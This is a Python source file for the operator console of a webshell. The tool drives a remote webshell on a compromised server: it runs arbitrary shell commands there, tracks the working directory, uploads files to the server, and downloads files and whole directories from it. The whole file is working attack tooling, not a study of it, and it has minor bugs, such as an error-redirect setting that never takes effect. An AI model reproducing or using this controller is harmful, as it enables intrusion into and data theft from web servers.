"""
 Author: Ido
 Date: 27/08/21
 Purpose: Be the shell context for the webshell, run shell commands, putfile and getfile
"""

import cmd2
import argparse
import pathlib
import base64

from webshell_master_cmd import WebshellCmd
from snippets.snippet_handler import get_snippet
from communication import send_snippet


class ShellTerminal(WebshellCmd):
    """
    Be shell context for the webshell, run shell commands, putfile and getfile
    """

    def __init__(self):
        super(WebshellCmd, self).__init__()
        self.cwd = "."
        self.prompt = ".> "
        self.do_cd(cmd2.Statement("."))
        self.add_settable(cmd2.Settable("show_errors", bool, "Redirect errors to stdout", self,
                                        onchange_cb=self._onchange_show_errors))
        self.show_errors = True
        self._redirect_errors = " 2>&1"

    def default(self, statement: cmd2.Statement):
        snippet = get_snippet("system_command.snippet",
                              {"CURRENT_DIRECTORY": self.cwd, "SYSTEM_COMMAND": statement.raw + self._redirect_errors})
        print(send_snippet(snippet))

    def do_cd(self, statement: cmd2.Statement):
        """
        Implement stateful shell execution
        :param statement: Statement argument
        """
        snippet = get_snippet("directory_change.snippet",
                              {"OLD_DIRECTORY": self.cwd, "DIRECTORY_CHANGE": statement.args})
        self.cwd = send_snippet(snippet)
        self.prompt = self.cwd + "> "

    def do_upload(self, statement: cmd2.Statement):
        """
        upload a local file to the remote webshell webserver, usage: upload local_file remote_path
        :param statement: upload command statement
        """
        print(statement.arg_list)
        upload_parser = argparse.ArgumentParser(prog="File upload",
                                                description="process upload information to server")
        upload_parser.add_argument('local', help="Path to the file on the local machine")
        upload_parser.add_argument('remote', help="Path to the file on the remote machine, default: local name",
                                   default=None)
        if len(statement.arg_list) == 1:
            statement.arg_list.append(pathlib.Path(statement.arg_list[0]).stem)
        parsed_args = vars(upload_parser.parse_args(statement.arg_list))
        local_file = pathlib.Path(parsed_args['local'])
        snippet = get_snippet("file_upload.snippet", {"CURRENT_DIRECTORY": self.cwd})
        print(send_snippet(snippet, files={'uploaded_file': (parsed_args['remote'], local_file.read_bytes())}))

    def do_download(self, statement: cmd2.Statement):
        download_parser = argparse.ArgumentParser(prog="File download",
                                                  description="create download request to server")
        download_parser.add_argument('remote', help="Path to the file on the remote machine",
                                     default=None)
        download_parser.add_argument('local', help="Path to the file on the local machine, default: local name")
        download_parser.add_argument('-d', '--directory', action="store_true", help="is the item a directory?")
        parsed_args = vars(download_parser.parse_args(statement.arg_list))

        if not parsed_args['local']:
            parsed_args['local'] = pathlib.Path(parsed_args['remote']).stem
        print(parsed_args)
        if parsed_args['directory']:
            self.download_directory(parsed_args)
        else:
            self.download_file(parsed_args)

    def download_file(self, snippet_args: dict):
        snippet = get_snippet("file_download.snippet",
                              {"CURRENT_DIRECTORY": self.cwd, "FILE_PATH": snippet_args['remote']})
        file_data = base64.b64decode(send_snippet(snippet))
        local_file = pathlib.Path(snippet_args['local'])
        local_file.write_bytes(file_data)
        print(f"the file {snippet_args['remote']} has been successfully written to {snippet_args['local']}")

    def download_directory(self, snippet_args: dict):
        error_message = f"could not download {snippet_args['remote']} - directory does not exist"
        snippet = get_snippet("directory_download.snippet",
                              {"CURRENT_DIRECTORY": self.cwd,
                               "FOLDER_TO_DOWNLOAD": snippet_args['remote'],
                               "ERROR_MESSAGE": error_message})
        response = send_snippet(snippet)
        if response == error_message:
            print(response)
        else:
            pass
            file_data = base64.b64decode(response)
            local_file = pathlib.Path(snippet_args['local'])
            local_file.write_bytes(file_data)
            print(f"hopefully successfully wrote the directory to {snippet_args['local']}")

    def _onchange_show_errors(self, setting_name, old, new):
        if new:
            self.redirect_errors = "2>&1"
        else:
            self.redirect_errors = ""
